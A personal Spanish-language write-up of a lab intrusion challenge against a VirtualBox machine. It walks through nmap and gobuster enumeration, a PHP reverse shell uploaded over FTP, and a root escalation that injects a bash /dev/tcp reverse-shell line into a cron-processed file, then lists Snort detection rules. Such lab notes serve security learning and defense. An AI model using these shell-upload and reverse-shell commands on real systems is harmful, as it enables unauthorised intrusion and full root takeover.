# 🛡️ Reto de Ciberseguridad: Intrusión y Defensa en "IDServiceVM"

> Documentación personal del reto de ciberseguridad en entorno controlado. Este archivo recoge paso a paso el análisis, ataques, accesos, escalada de privilegios y defensa con reglas IDS. Contiene explicaciones y comandos clave para futuras referencias.

---

## 🎯 Objetivos del reto

1. **Acceso Inicial Múltiple:**

   * Acceder a la máquina víctima por **FTP** subiendo una shell web.
   * Acceder por **SSH** con las mismas credenciales.

2. **Escalada de privilegios:**

   * Elevar privilegios hasta obtener una shell como `root`.

3. **Defensa y Detección (Blue Team):**

   * Crear reglas Snort para detectar vectores de ataque utilizados.

---

## 🧩 Fase 1: Reconocimiento y Acceso Inicial

### 🔌 1.1 Configuración de red

* Tipo de red usada: **Red NAT personalizada (Red NAT de VirtualBox)**.
* Ambas VMs (Kali + IDServiceVM) conectadas a la misma red virtual.

### 🔎 1.2 Descubrimiento de IP

```bash
sudo nmap -sn 10.0.2.0/24
```

* Se identificó la IP de la víctima: `10.0.2.10`
* MAC: Oracle VirtualBox NIC

### 📡 1.3 Escaneo de puertos

```bash
sudo nmap -sS -p- 10.0.2.10
```

* Puertos abiertos:

  * `21` FTP
  * `22` SSH
  * `80` HTTP
  * `5011` Servicio desconocido (posiblemente vulnerable)

### 📜 1.4 Enumeración de servicios

```bash
sudo nmap -sV -sC 10.0.2.10
```

* Se obtienen banners de versión y posibles vulnerabilidades
* Banner grabbing en HTTP, SSH y FTP realizado para asociar CVEs

### 🌐 1.5 Enumeración Web

```bash
gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirb/common.txt
```

* Búsqueda de archivos sensibles: `README`, `config.php`, `.git`, etc.
* Uso de `curl`, `nikto`, `whatweb` para fingerprinting web.

### 🐚 1.6 Acceso FTP + Web Shell

```bash
ftp 10.0.2.10
# Subir php-reverse-shell.php (modificada con IP de Kali y puerto 4444)
```

En Kali:

```bash
nc -lvnp 4444
```

En navegador:

```
http://10.0.2.10/uploads/php-reverse-shell.php
```

➡️ Acceso conseguido.

### 🐚 1.7 Acceso SSH

```bash
ssh usuario@10.0.2.10
```

➡️ Mismo usuario/credenciales reutilizadas.

---

## 🔐 Fase 2: Escalada de Privilegios

### 🧠 2.1 Enumeración interna

```bash
whoami
sudo -l
find / -perm -4000 2>/dev/null
ps aux | grep root
cat /etc/crontab
```

### 🔍 2.2 Análisis de scripts

* Revisar scripts ejecutados por cron o root.
* Buscar comandos con entradas no sanitizadas.

### 💣 2.3 Explotación

Ejemplo:

```bash
echo '$(/bin/bash -i >& /dev/tcp/10.0.2.15/4445 0>&1)' > /etc/backup-files.txt
```

Y en Kali:

```bash
nc -lvnp 4445
```

➡️ Shell como root obtenida.

---

## 🔒 Fase 3: Defensa y Detección (IDS - Snort)

### 🧷 Reglas creadas:

#### 1. Acceso a archivo sensible por HTTP

```snort
alert tcp any any -> any 80 (msg:"[ALERTA] Acceso a archivo sensible"; content:"README"; http_uri; nocase; sid:100001;)
```

#### 2. Subida de archivos por FTP

```snort
alert tcp any any -> any 21 (msg:"[ALERTA] Subida de archivo por FTP"; content:"STOR"; nocase; sid:100002;)
```

#### 3. Conexión SSH detectada

```snort
alert tcp any any -> any 22 (msg:"[ALERTA] Conexión SSH detectada"; flags:S; sid:100003;)
```

#### 4. Inyección de comandos por URL

```snort
alert tcp any any -> any 80 (msg:"[ALERTA] Inyección de comandos"; content:";cat"; http_uri; nocase; sid:100004;)
```

---

## 📘 Observaciones y Notas personales

* Recordar revisar `robots.txt` y `.git` en enumeraciones web.
* Los puertos altos (>1024) pueden ser servicios web alternativos.
* Usar `searchsploit` para encontrar CVEs por versión:

  ```bash
  searchsploit apache 2.4.18
  ```
* Snort es muy potente, pero también sensible a falsos positivos.
* Documentar todo siempre ayuda a ganar velocidad en futuras auditorías.

---

## ✅ Estado del reto

* [x] Acceso FTP
* [x] Web Shell activa
* [x] Acceso SSH
* [x] Escalada a root
* [x] Reglas IDS funcionando

---

**Fin del documento**
📁 Archivo de uso personal para repaso, replicación o actualización futura.
